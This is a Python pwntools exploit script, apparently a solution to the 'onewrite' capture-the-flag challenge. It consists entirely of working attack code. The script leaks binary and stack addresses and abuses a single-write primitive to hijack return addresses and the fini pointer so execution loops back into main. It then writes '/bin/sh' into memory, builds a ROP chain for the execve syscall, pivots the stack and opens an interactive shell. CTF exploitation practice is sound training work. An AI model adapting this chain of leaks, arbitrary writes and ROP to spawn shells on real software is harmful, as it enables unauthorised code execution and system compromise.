#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template onewrite
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('onewrite')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    p = process([exe.path] + argv, *a, **kw)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript, *a, **kw)

    return p

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
# b do_overwrite
b __libc_csu_fini
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def read(option: int) -> int:
    io.recvuntil(b" > ")
    io.sendline(str(option).encode())
    leak = int(io.recvline().strip(), 0)
    log.info(f"Got leak: {hex(leak)}")
    return leak

def write(where: int, what: bytes) -> None:
    log.info(f"Setting data under address: {hex(where)} to: {what}")
    where = str(where).encode()
    io.recvuntil(b"address : ")
    io.send(where)
    io.recvuntil(b"data : ")
    io.send(what)

def evil_write(where: int, what: bytes) -> None:
    stack_leak = read(1)
    return_address = stack_leak + 0x28
    log.info(f"Return address is @ {hex(return_address)}")
    write(return_address, p64(exe.sym.main))

    stack_leak = read(1)
    return_address = stack_leak + 0x18
    log.info(f"Return address is @ {hex(return_address)}")
    write(return_address, p64(exe.sym.main))

    stack_leak = read(1)
    write(where, p64(what))

_rop = lambda ptr: ptr + exe.address

io = start()

binary_leak = read(2)
exe.address = binary_leak - 0x8a15
fini = _rop(0x2adfb8)
log.info(f"binary base is @ {hex(exe.address)}")
write(fini, p64(exe.sym.main))

stack_leak = read(1)
return_address = stack_leak + 0x18
log.info(f"Return address is @ {hex(return_address)}")
write(return_address, p64(exe.sym.main))

bss = exe.address + 0x2ad000

pop_rdi = 0x0084fa # pop rdi; ret;
pop_rax = 0x0460ac # pop rax; ret;
pop_rsi = 0x00d9f2 # pop rsi; ret; 
pop_rdx = 0x0484c5 # pop rdx; ret;
pop_rsp = 0x00946a # pop rsp; ret; 
syscall = 0x00917c # syscall;

evil_write(bss, int.from_bytes(b"/bin/sh\x00", "little"))

chain = [
    _rop(pop_rdi), bss,
    _rop(pop_rax), 0x3b,
    _rop(pop_rsi), 0x0,
    _rop(pop_rdx), 0x0,
    _rop(syscall)
]

for off, elem in enumerate(chain):
    evil_write(bss + 0x10 + off * 0x8, elem)

stack_leak = read(1)
return_address = stack_leak + 0x28
write(return_address, p64(exe.sym.main))
if args.GDB:
    pause()
evil_write(stack_leak + 0x40, bss + 0x10)
evil_write(stack_leak + 0x38, _rop(pop_rsp))

io.interactive()

